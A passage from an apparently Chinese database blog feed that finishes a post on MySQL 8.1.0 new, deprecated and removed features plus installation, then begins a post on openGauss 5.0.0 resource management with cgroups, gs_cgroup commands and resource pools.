<h3 id="MySQL-复制：SOURCE-RETRY-COUNT-变更">MySQL 复制：SOURCE_RETRY_COUNT 变更</h3>
<p><a href="https://dev.mysql.com/doc/refman/8.1/en/change-replication-source-to.html"><code>CHANGE REPLICATION SOURCE TO</code></a> 语句的 <code>SOURCE_RETRY_COUNT</code> 选项的默认值已更改为 10。这意味着，使用此选项的默认值和 <code>SOURCE_CONNECT_RETRY(60)</code> ，副本在重新连接尝试之间等待 60 秒，并在超时和故障转移之前以此比率尝试重新连接 10 分钟。</p>
<p>此更改也适用于已弃用的 <a href="https://dev.mysql.com/doc/refman/8.1/en/replication-options-replica.html#option_mysqld_master-retry-count"><code>--master-retry-count</code></a> 选项的默认值。(您应该使用 <code>SOURCE_RETRY_COUNT</code> 替代。)</p>
<h3 id="group-replication-set-as-primary-和-DDL-语句"><code>group_replication_set_as_primary()</code> 和 DDL 语句</h3>
<p>在选出一个新的主节点之前，<a href="https://dev.mysql.com/doc/refman/8.1/en/group-replication-functions-for-new-primary.html#function_group-replication-set-as-primary"><code>group_replication_set_as_primary()</code></a> 函数等待所有事务完成，包括所有当前正在进行中的 DML 操作。在这个发布的版本中，也会等待所有正在进行的 DDL 语句完成，比如 <code>ALTER TABLE</code>。 (Bug#34664197, WL#15497)</p>
<h3 id="MySQL-版本号">MySQL 版本号</h3>
<p>版本特定注释中使用的 MySQL 版本号现在支持由一个或两个数字组成的主版本，这意味着整个版本现在可以是五位数或六位数长。</p>
<p>版本号格式为 <code>Mmmrr</code>，其中 M 为主要版本号，mm 为两位数字的次要版本号，rr 为两位数字的发布号。例如:在仅由 MySQL 服务器 8.1.0 或更高版本运行的语句中，在注释中使用 <code>80100</code>。</p>
<p>在 MySQL 8.1 中，版本号也可以选择由 MMmmrr 格式的六位数字组成，其中 MM 是两位数字的主版本号，MM 和 rr 分别是两位数字的副版本号和两位数字的发布号。</p>
<img  alt="5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230718-cfdd40d8-7e4c-4755-bca9-c86133996633.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="错误日志加强">错误日志加强</h3>
<p>随着 MySQL 服务器、插件和组件的启动和关闭消息的增加，关闭过程的日志记录得到了增强。这些消息现在也被记录为关闭连接。这些附加功能应该有助于故障排除和调试问题，特别是在服务器需要很长时间才能关闭的情况下。</p>
<blockquote>
<p>相关 WorkLog: <a class="link"   href="https://github.com/mysql/mysql-server/commit/a0dd60dc022a74965f4f95fb1b21075f791ccfcd" >WL#15369 Add progress information to the error log during shutdown  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<img  alt="6.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230718-bf0fa76a-606d-4717-98e5-eef785ef3182.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="新增-SHOW-PARSE-TREE-语句">新增 <code>SHOW PARSE_TREE</code> 语句</h3>
<p>新增 <a href="https://dev.mysql.com/doc/refman/8.1/en/show-parse-tree.html"><code>SHOW PARSE_TREE</code></a> 语句，显示 <code>SELECT</code> 语句的 <code>JSON</code> 格式的解析树。此语句仅用于测试和开发，而非生产环境。它仅在调试版本中可用，或者是使用 CMake  <a href="https://dev.mysql.com/doc/refman/8.1/en/source-configuration-options.html#option_cmake_with_show_parse_tree"><code>-DWITH_SHOW_PARSE_TREE</code></a> 选项从源代码构建的 MySQL，在正式发布版本中并不包括或支持该语句。</p>
<p>示例：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> PARSE_TREE <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> t3 <span class="keyword">WHERE</span> o_id <span class="operator">&gt;</span> <span class="number">2</span>\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Show_parse_tree: &#123;</span><br><span class="line">  &quot;text&quot;: &quot;SELECT * FROM t3 WHERE o_id &gt; 2&quot;,</span><br><span class="line">  &quot;type&quot;: &quot;PT_select_stmt&quot;,</span><br><span class="line">  &quot;components&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;text&quot;: &quot;SELECT * FROM t3 WHERE o_id &gt; 2&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;PT_query_expression&quot;,</span><br><span class="line">      &quot;components&quot;: [</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<h3 id="新增-tls-certificates-enforced-validation-系统变量">新增 <code>tls-certificates-enforced-validation</code> 系统变量</h3>
<p>新增 <a href="https://dev.mysql.com/doc/refman/8.1/en/server-system-variables.html#sysvar_tls_certificates_enforced_validation"><code>tls-certificates-enforced-validation</code></a> 系统变量，该变量允许 DBA 在服务器启动时强制执行证书验证，或使用 <a href="https://dev.mysql.com/doc/refman/8.1/en/alter-instance.html#alter-instance-reload-tls"><code>ALTER INSTANCE RELOAD TLS</code></a> 语句时重新加载证书。启用强制执行后，在启动时发现无效证书将停止服务器调用，防止在运行时加载无效证书，并发出警告。</p>
<blockquote>
<p>此强制校验默认为禁用状态，默认值为 OFF。</p>
</blockquote>
<h3 id="组复制-Group-Replication-增强">组复制 (Group Replication) 增强</h3>
<p>添加了一些特定于组复制插件的状态变量，这些变量可以改进对网络不稳定的诊断和故障排除，为每个组成员 (group member) 提供有关网络使用情况、控制消息和数据消息的统计信息。</p>
<p>作为这项工作的一部分，Performance Schema 的 <a href="https://dev.mysql.com/doc/refman/8.1/en/performance-schema-replication-group-communication-information-table.html"><code>replication_group_communication_information</code></a> 表中添加了一个新列 <code>MEMBER_FAILURE_SUSPICIONS_COUNT</code> 。该列的内容被格式化为一个 JSON 数组，其键是组成员 ID，其值是该组成员被认为是可疑的次数。</p>
<blockquote>
<p>只有当组复制插件安装之后，才能使用这张表。否则会报这张表不存在。</p>
</blockquote>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> replication_group_communication_information\G</span><br><span class="line">ERROR <span class="number">1146</span> (<span class="number">42</span>S02): <span class="keyword">Table</span> <span class="string">&#x27;performance_schema.replication_group_communication_information&#x27;</span> doesn<span class="string">&#x27;t exist</span></span><br></pre></td></tr></table></figure></div>
<img  alt="7.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230718-d8ad9206-c068-4f29-85cc-ec37ec0c5e63.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="新增-LDAP-变量">新增 LDAP 变量</h3>
<p>新增服务器系统变量，以控制当 LDAP 服务器关闭或无响应时，使用 LDAP 可插入身份验证连接到 MySQL 服务器的 MySQL 帐户必须等待的时间。对于以下简单和基于 SASL 的 LDAP 身份验证变量，新的默认超时为 30 秒：</p>
<ul>
<li>authentication_ldap_simple_connect_timeout</li>
<li>authentication_ldap_simple_response_timeout</li>
<li>authentication_ldap_sasl_connect_timeout</li>
<li>authentication_ldap_sasl_response_timeout</li>
</ul>
<p>连接和响应超时只能通过 Linux 平台上的系统变量进行配置。</p>
<h2 id="MySQL-8-1-废弃特性">MySQL 8.1 废弃特性</h2>
<p>以下功能在 MySQL 8.1 中已弃用，并且可能会在未来的系列中删除。如果显示替代方案，则应更新应用程序以使用它们。</p>
<p>对于使用 MySQL 8.1 中已弃用且已在更高版本 MySQL 系列中删除的功能的应用程序，从 MySQL 8.1 复制到更高系列副本时，语句可能会失败，或者可能对源和副本产生不同的影响。为了避免此类问题，应修改使用 8.1 中已弃用功能的应用程序以避免这些问题，并尽可能使用替代方案。</p>
<h3 id="8-0-34-和-8-1-0-中的废弃项">8.0.34 和 8.1.0 中的废弃项</h3>
<p>MySQL 8.0 手册中记录了 8.0.34 和 8.1.0 中弃用的功能。请参阅 <a class="link"   href="https://dev.mysql.com/doc/refman/8.0/en/mysql-nutshell.html#mysql-nutshell-deprecations" >MySQL 8.0 相关文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="MySQL-8-1-移除特性">MySQL 8.1 移除特性</h2>
<p>以下项目已过时并已在 MySQL 8.1 中删除。 如果显示替代方案，则应更新应用程序以使用它们。</p>
<p>对于使用 MySQL 8.1 中删除的功能的 MySQL 8.0 应用程序，从 MySQL 8.0 复制到 MySQL 8.1 副本时，语句可能会失败，或者可能对源和副本产生不同的影响。 为了避免此类问题，应修改使用 MySQL 8.1 中删除的功能的应用程序以避免这些问题，并尽可能使用替代方案。</p>
<h3 id="系统变量和-NULL">系统变量和 NULL</h3>
<p>不预留或不支持将 MySQL 服务器启动选项设置为 NULL (<code>--my-option=NULL</code>)，也并不可能让服务器将其解释为 SQL 的 <code> NULL</code>。MySQL 8.1 明确禁止以这种方式将启动选项设置为 <code>NULL</code>，并拒绝尝试执行错误操作。试图在 mysql 客户端使用 <code>SET</code> 或类似的方法将相应的服务器系统变量设置为 <code>NULL</code> 也会被拒绝。</p>
<p>以下列表中的服务器系统变量不受刚才描述的限制：</p>
<ul>
<li>admin_ssl_ca</li>
<li>admin_ssl_capath</li>
<li>admin_ssl_cert</li>
<li>admin_ssl_cipher</li>
<li>admin_tls_ciphersuites</li>
<li>admin_ssl_key</li>
<li>admin_ssl_crl</li>
<li>admin_ssl_crlpath</li>
<li>basedir</li>
<li>character_sets_dir</li>
<li>ft_stopword_file</li>
<li>group_replication_recovery_tls_ciphersuites</li>
<li>init_file</li>
<li>lc_messages_dir</li>
<li>plugin_dir</li>
<li>relay_log</li>
<li>relay_log_info_file</li>
<li>replica_load_tmpdir</li>
<li>ssl_ca</li>
<li>ssl_capath</li>
<li>ssl_cert</li>
<li>ssl_cipher</li>
<li>ssl_crl</li>
<li>ssl_crlpath</li>
<li>ssl_key</li>
<li>socket</li>
<li>tls_ciphersuites</li>
<li>tmpdir</li>
</ul>
<h3 id="带有美元符号开头的标识符">带有美元符号开头的标识符</h3>
<p>MySQL 8.0 中不推荐使用美元符号 (<code>$</code>) 作为不带引号的标识符的首字符，并且在 MySQL 8.1.0 中受到限制。使用以美元符号开头并包含一个或多个美元符号（除了第一个美元符号之外）的不带引号的标识符现在会生成语法错误。</p>
<p>如果以 <code>$</code> 开头的不带引号的标识符不包含任何其他 <code>$</code> 字符，则不受此限制的影响。</p>
<h2 id="🧋-MySQL-8-1-0-其他变更">🧋 MySQL 8.1.0 其他变更</h2>
<h3 id="✅-libmysqlclient-so">✅ <a class="link"   href="http://libmysqlclient.so" >libmysqlclient.so <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3>
<p>现在 <a class="link"   href="http://libmysqlclient.so" >libmysqlclient.so <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 共享库中添加了几个函数，使开发人员能够访问 MySQL 服务器二进制日志：<a href="https://dev.mysql.com/doc/c-api/8.1/en/mysql-binlog-open.html"><code>mysql_binlog_open()</code></a> 、mysql_binlog_fetch() 和 mysql_binlog_close()。 (Bug <a class="link"   href="https://bugs.mysql.com/bug.php?id=110658" >#110658 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> , Bug #35282154)</p>
<img  alt="8.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230718-c2956d91-f7e8-4b2a-aadb-a4e7478960a0.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="🤠-Telemetry-遥测">🤠 Telemetry 遥测</h3>
<p>MySQL 企业版现在支持使用 component_telemetry 组件以 <a class="link"   href="https://opentelemetry.io/" >OpenTelemetry <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 格式收集服务器跟踪数据。然后，这些数据被转发到一个可配置的端点，在那里它可以被任何与 OpenTelemetry 兼容的系统使用。(<a class="link"   href="https://github.com/mysql/mysql-server/commit/e97a8205e4f265aeb9c306296c63f6bd72660cab" >WL #15198 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
<p>遥测跟踪仅支持 Linux 平台上的 MySQL 企业版。</p>
<h3 id="⤵️-mysqlpump">⤵️ mysqlpump</h3>
<p>由于 MySQL 提供了具有相同或额外功能的 mysqldump 和 MySQL Shell 等其他方法来执行数据库转储和备份，mysqlpump 已经变得多余，现在已弃用。现在调用这个程序会产生一个警告。您应该记住，mysqlpump 可能会在 MySQL 的未来版本中被删除。(<a class="link"   href="https://github.com/mysql/mysql-server/commit/dd81a0e88f4ea85e08bb95a5d39703ccf8138ae4" >WL#15652 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
<img  alt="9.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230719-cd41396b-4757-4bb7-9875-f401dd66d6c7.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="⤵️-binlog-format">⤵️ binlog_format</h3>
<p>binlog_format 服务器系统变量现已弃用，并且可能会在 MySQL 的未来版本中删除。 与此变量关联的功能（更改二进制日志记录格式）也已被弃用。</p>
<p>此更改的含义是，当删除 binlog_format 时，MySQL 服务器将仅支持基于行的二进制日志记录（MySQL 8.0 中的默认设置）。 因此，新安装应仅使用基于行 (Row) 的二进制日志记录，而使用基于语句或混合日志记录格式的现有安装应迁移到基于行的格式。</p>
<p>系统变量 log_bin_trust_function_creators 和 log_statements_unsafe_for_binlog 仅在基于语句的日志记录上下文中有用，现在也已弃用，因此也将在 MySQL 的未来版本中删除。</p>
<p>现在设置或选择刚才提到的任何变量的值都会引发警告。 （WL#13966，WL#15669）</p>
<h3 id="⤵️-mysql-native-password">⤵️ mysql_native_password</h3>
<p><code>mysql_native_password</code> 身份验证插件现已弃用，并可能在 MySQL 的未来版本中删除。 如果帐户尝试使用 <code>mysql_native_password</code> 作为身份验证方法进行身份验证，<code>CREATE USER</code>、<code>ALTER USER</code> 和 <code>SET PASSWORD</code> 操作现在会在服务器错误日志中插入弃用警告。 （Bug#35336317）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2023-07-18T15:59:24.245820Z 11 [Warning] [MY-013360] [Server] Plugin mysql_native_password reported: </span><br><span class="line">&#x27;&#x27;mysql_native_password&#x27; is deprecated and will be removed in a future release. Please use caching_sha2_password instead&#x27;</span><br></pre></td></tr></table></figure></div>
<img  alt="10.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230719-c2d4cb36-2993-4e9a-918e-46f61b9bada0.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="🚀-MySQL-8-1-0-下载-安装-体验">🚀 MySQL 8.1.0 下载 &amp; 安装 &amp; 体验</h2>
<p>官网下载渠道已开放：<a class="link"   href="https://dev.mysql.com/downloads/mysql/" >MySQL Community Server 8.1.0 Innovation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>其中，el7 的 rpm 完整安装包约 1.0 GB。</p>
<img  alt="11.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230718-e13e540a-8411-4dbd-a1f8-fc5437d19a22.png"
                      referrerpolicy="no-referrer"
                >
<p>下载完成后，直接 yum 安装即可。</p>
<img  alt="12.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230718-0811f445-0a96-4538-a8b6-9003b0668a77.png"
                      referrerpolicy="no-referrer"
                >
<p>安装过程中会替代系统自动的 mariadb lib 包。</p>
<img  alt="13.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230718-49fe779f-d62c-4528-a1f7-015b7c326d6f.png"
                      referrerpolicy="no-referrer"
                >
<p>安装后，已经自动安装了 systemd 文件，直接启动 mysqld 服务。</p>
<img  alt="14.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230718-f7c8611d-03f6-4f93-b077-facee6400019.png"
                      referrerpolicy="no-referrer"
                >
<p>从 mysqld 日志文件中获取初始密码，登录后修改。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">alter</span> <span class="keyword">user</span> root<span class="variable">@localhost</span> identified <span class="keyword">with</span> mysql_native_password <span class="keyword">by</span> <span class="string">&#x27;Yan@123456&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<img  alt="15.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230718-6e8fb46b-60c5-4ff3-a5af-2931f5d10a5a.png"
                      referrerpolicy="no-referrer"
                >
<p>再次登录 MySQL 服务器，查看当前状态信息，可以看到服务器版本号为 <code>8.1.0 MySQL Community Server - GPL</code>。</p>
<img  alt="16.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230718-afcc774d-6a32-4013-81d1-38ffb3f9f5cb.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="REF">REF</h2>
<ul>
<li><a class="link"   href="https://dev.mysql.com/doc/refman/8.1/en/" >https://dev.mysql.com/doc/refman/8.1/en/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://dev.mysql.com/doc/relnotes/mysql/8.1/en/news-8-1-0.html" >https://dev.mysql.com/doc/relnotes/mysql/8.1/en/news-8-1-0.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://blogs.oracle.com/mysql/post/introducing-mysql-innovation-and-longterm-support-lts-versions" >Introducing MySQL Innovation and Long-Term Support (LTS) versions <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>MySQL</category>
        <category>MySQL 8.x</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>mysql 8.1</tag>
        <tag>mysql news</tag>
        <tag>mysql 新特性</tag>
      </tags>
  </entry>
  <entry>
    <title>openGauss 5.0.0 资源管控功能介绍</title>
    <url>/2023/opengauss/opengauss-v5-resource-load-mgmt/</url>
    <content><![CDATA[<img  alt="ogbanner.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230707-3141c49c-5099-49bb-bc9b-057487be5c8d.png"
                      referrerpolicy="no-referrer"
                >
<p>openGauss 5.0.0 在资源管控方面有了显著的提升。在原生的 PostgreSQL 中其实并没有资源管控特性，但是在 EDB 版本，及其他云厂的 PG 中，增加了资源管控能力，对于 Serverless 时代的数据库而言，资源管控能力是非常重要的，因为它可以直接影响系统的性能和稳定性，通过资源管理可以来均衡业务流对数据库资源的利用，或控制不同用户的资源分配。本文将重点介绍 openGauss 5.0.0 的资源管控功能。</p>
<h2 id="概念综述">概念综述</h2>
<p>openGauss 5.0.0 的资源管控功能体现在其强大的资源管理能力上。openGauss 对于系统资源的管理可以有效地管理和限制数据库实例对系统资源的占用。</p>
<p>这里涉及到几个核心概念<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>：</p>
<ul>
<li>
<p>资源管理<br>
openGauss 对于系统资源的管理范围包含 CPU 资源、内存资源、IO 资源和存储资源。通过对系统的资源进行合理的分配，避免发生资源的不合理占用导致系统运行效率下降或者引发系统运行问题。</p>
</li>
<li>
<p>控制组<br>
控制组（Cgroups）是 control groups 的缩写，是 Linux 内核提供的一种可以限制、记录、隔离进程组所使用的物理资源（如：CPU、内存、IO等）的机制。如果一个进程加入了某一个控制组，该控制组对 Linux 的系统资源都有严格的限制，进程在使用这些资源时，不能超过其最大限制。</p>
</li>
<li>
<p>资源池<br>
资源池（Resource Pool）是 openGauss 提供的一种配置机制，用于对主机资源（内存、IO）进行划分并提供 SQL 的并发控制能力。资源池通过绑定 Cgroups 对资源进行管理。用户通过绑定资源池可以实现对其下作业的资源负载管理。</p>
</li>
<li>
<p>Cgroup<br>
openGauss 的资源控制特性使用 Linux 内核的 Cgroup 特性实现，通常情况下，openGauss 的 Cgroup 拥有整个系统 80% 的动态资源，但它不能超过 95% 的硬性限制。<br>
这里补充一个知识点，如何确认当前系统以及初始化了 cgroup 资源，可以使用 <code>dmesg</code> 命令查看系统开机信息，示例如下：</p>
</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~]# dmesg | grep cgroup</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpuset</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpu</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpuacct</span><br><span class="line">[    1.090659] Initializing cgroup subsys memory</span><br><span class="line">[    1.090670] Initializing cgroup subsys devices</span><br><span class="line">[    1.090672] Initializing cgroup subsys freezer</span><br><span class="line">[    1.090677] Initializing cgroup subsys net_cls</span><br><span class="line">[    1.090686] Initializing cgroup subsys blkio</span><br><span class="line">[    1.090688] Initializing cgroup subsys perf_event</span><br><span class="line">[    1.090693] Initializing cgroup subsys hugetlb</span><br><span class="line">[    1.090695] Initializing cgroup subsys pids</span><br><span class="line">[    1.090696] Initializing cgroup subsys net_prio</span><br></pre></td></tr></table></figure></div>
<h2 id="启用资源管控功能">启用资源管控功能</h2>
<p>为了便于开发者或初学者学习，openGauss 分别推出了 企业版、极简版、轻量版和分布式版本。本文案例使用的是企业版，基于 CentOS 7.9 系统，安装包下载页面在<a class="link"   href="https://opengauss.org/zh/download/" >这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。也只能用企业版，因为只有企业版才具备完整的集群管理功能，才能进行相关功能测试验证。</p>
<p>企业版的安装步骤中已包含 cgroup 相关配置，这里不做过多描述。</p>
<p>先看安装完成后的版本信息和集群状态，都是 Normal。</p>
<img  alt="og01.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230712-f00a07cc-160b-4223-8461-ebd8df3ef71b.png"
                      referrerpolicy="no-referrer"
                >
<p>更改 <code>use_workload_manager</code> 参数，开启基于资源池的资源负载管理功能。<br>
更改成功后，需要重启集群，以使其生效。<br>
重启完成后，可以通过系统表 <code>gs_all_control_group_info</code> 查看当前集群的控制组信息。</p>
<img  alt="og02.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230712-25cd54b9-eec4-46ad-9a33-58bb7f7f6d4c.png"
                      referrerpolicy="no-referrer"
                >
<p>当然，如果 cgroup 配置出现问题，或者不支持资源管控特性，则会报错：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">omm=# SELECT * FROM gs_all_control_group_info;</span><br><span class="line">ERROR:  cgroup is not initialized!</span><br></pre></td></tr></table></figure></div>
<h2 id="查看控制组信息">查看控制组信息</h2>
<p>openGauss 提供了 <code>gs_cgroup</code> 命令，用于管理各节点上的 Gauss cgroup。可以用来创建默认控制组、删除控制组、挂载和卸载控制组。当然也可以显示控制组信息。</p>
<p>例如，调用命令 <code>gs_cgroup -p</code> 显示控制组配置信息。</p>
<img  alt="og03.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230712-5576a81d-a971-4f6f-bac4-c0a0b47dd894.png"
                      referrerpolicy="no-referrer"
                >
<p>再如，调用命令 <code>gs_cgroup -P</code> 显示整个集群的所有 cgroups 树信息。</p>
<img  alt="og04.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230712-ab266be7-8638-4121-a293-8cc4facd4dc5.png"
                      referrerpolicy="no-referrer"
                >
<p><code>gs_cgroup</code> 还有其他用法，这里不做过多介绍，具体用法建议参考 <code>gs_cgroup --help</code>。</p>
<h2 id="创建子-Class-控制组-和-Workload-控制组">创建子 Class 控制组 和 Workload 控制组</h2>
<ul>
<li>创建名称为 <code>class_a</code> 和 <code>class_b</code> 的子 Class 控制组，CPU 资源配额分别为 Class 的 40% 和 20%。</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gs_cgroup -c -S class_a -s 40</span><br><span class="line">gs_cgroup -c -S class_b -s 20</span><br></pre></td></tr></table></figure></div>
<ul>
<li>创建子 Class 控制组 <code>class_a</code> 下名称为 <code>wd_a1</code> 和 <code>wd_a2</code> 的 Workload 控制组，CPU资源配额分别为 <code>class_a</code> 控制组的 20% 和 60%。</li>
<li>创建子 Class 控制组 <code>class_b</code> 下名称为 <code>wd_b1</code> 和 <code>wd_b2</code> 的 Workload 控制组，CPU资源配额分别为 <code>class_b</code> 控制组的 40% 和 50%。</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gs_cgroup -c -S class_a -G wd_a1 -g 20 </span><br><span class="line">gs_cgroup -c -S class_a -G wd_a2 -g 60 </span><br><span class="line"></span><br><span class="line">gs_cgroup -c -S class_b -G wd_b1 -g 40</span><br><span class="line">gs_cgroup -c -S class_b -G wd_b2 -g 50</span><br></pre></td></tr></table></figure></div>
<p>创建成功后，通过系统表查看设定信息。</p>
<img  alt="og05.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230712-c4250845-548d-402d-8d7d-9523294e3e53.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="创建资源池">创建资源池</h2>
<p>openGauss支持通过创建资源池对主机资源进行划分。开启资源负载管理之后，仅使用默认资源池并不能满足业务对资源负载管理的诉求，必须根据需要创建新的资源池，对系统资源进行重分配，来满足实际业务对系统资源精细管理的需要。</p>
<p>在开启了资源负载管理功能之后，系统会自动创建 <code>default_pool</code>，当一个会话或者用户没有指定关联的资源池时，都会被默认关联到 <code>default_pool</code>。<code>default_pool</code> 默认绑定 <code>DefaultClass:Medium</code> 控制组，并且不限制所关联的业务的并发数。</p>
<ul>
<li>创建组资源池关联到指定的子 Class 控制组。</li>
</ul>
<p>例如下面：名称为 <code>res_pool_a</code> 的组资源池关联到了 <code>class_a</code> 控制组。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> RESOURCE POOL res_pool_a <span class="keyword">WITH</span> (control_group<span class="operator">=</span><span class="string">&#x27;class_a&#x27;</span>);</span><br><span class="line"><span class="keyword">CREATE</span> RESOURCE POOL res_pool_b <span class="keyword">WITH</span> (control_group<span class="operator">=</span><span class="string">&#x27;class_b&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
<ul>
<li>创建业务资源池关联到指定的 Workload 控制组。</li>
</ul>
<p>例如下面：名称为 <code>res_pool_a1</code> 的业务资源池关联到了 <code>wd_a1</code> 控制组。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> RESOURCE POOL res_pool_a1 <span class="keyword">WITH</span> (control_group<span class="operator">=</span><span class="string">&#x27;class_a:wd_a1&#x27;</span>);</span><br><span class="line"><span class="keyword">CREATE</span> RESOURCE POOL res_pool_a2 <span class="keyword">WITH</span> (control_group<span class="operator">=</span><span class="string">&#x27;class_a:wd_a2&#x27;</span>);</span><br><span class="line"><span class="keyword">CREATE</span> RESOURCE POOL res_pool_b1 <span class="keyword">WITH</span> (control_group<span class="operator">=</span><span class="string">&#x27;class_b:wd_b1&#x27;</span>);</span><br><span class="line"><span class="keyword">CREATE</span> RESOURCE POOL res_pool_b2 <span class="keyword">WITH</span> (control_group<span class="operator">=</span><span class="string">&#x27;class_b:wd_b2&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
<img  alt="og06.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230712-e8d70b53-112d-4da4-a81b-3ceefe238d65.png"
